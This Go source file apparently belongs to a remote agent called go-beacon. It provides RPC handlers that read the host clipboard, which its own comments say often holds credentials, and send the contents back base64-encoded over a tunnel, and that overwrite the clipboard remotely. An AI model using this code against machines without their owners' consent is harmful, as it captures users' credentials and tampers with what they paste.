package main

import (
	"encoding/base64"

	"github.com/atotto/clipboard"
	"github.com/bolchisb/go-beacon/internal/protocol"
)

// A clipboard holds whatever the person at the keyboard last copied, which is
// often a credential. The cap is there so a runaway paste cannot be used to
// haul memory across the tunnel in one call.
const maxClipboardBytes = 1 << 20 // 1 MiB

// clipboardUnavailable explains the one case that is not a failure but a
// missing capability: a Linux host with no graphical session has no clipboard
// at all. Windows and macOS always have one.
const clipboardUnavailable = "no clipboard on this host: it needs a graphical session, " +
	"and on linux one of xclip, xsel or wl-clipboard"

func opClipboardRead() protocol.RPCResponse {
	if clipboard.Unsupported {
		return protocol.RPCResponse{Error: clipboardUnavailable}
	}

	text, err := clipboard.ReadAll()
	if err != nil {
		return protocol.RPCResponse{Error: "cannot read the clipboard: " + err.Error()}
	}

	truncated := false
	if len(text) > maxClipboardBytes {
		text, truncated = text[:maxClipboardBytes], true
	}
	return protocol.RPCResponse{
		Content:   base64.StdEncoding.EncodeToString([]byte(text)),
		Truncated: truncated,
	}
}

func opClipboardWrite(req protocol.RPCRequest) protocol.RPCResponse {
	if clipboard.Unsupported {
		return protocol.RPCResponse{Error: clipboardUnavailable}
	}

	text, err := base64.StdEncoding.DecodeString(req.Content)
	if err != nil {
		return protocol.RPCResponse{Error: "content must be base64: " + err.Error()}
	}
	if len(text) > maxClipboardBytes {
		return protocol.RPCResponse{Error: "content is larger than the 1 MiB clipboard limit"}
	}
	if err := clipboard.WriteAll(string(text)); err != nil {
		return protocol.RPCResponse{Error: "cannot write the clipboard: " + err.Error()}
	}
	return protocol.RPCResponse{Written: len(text)}
}
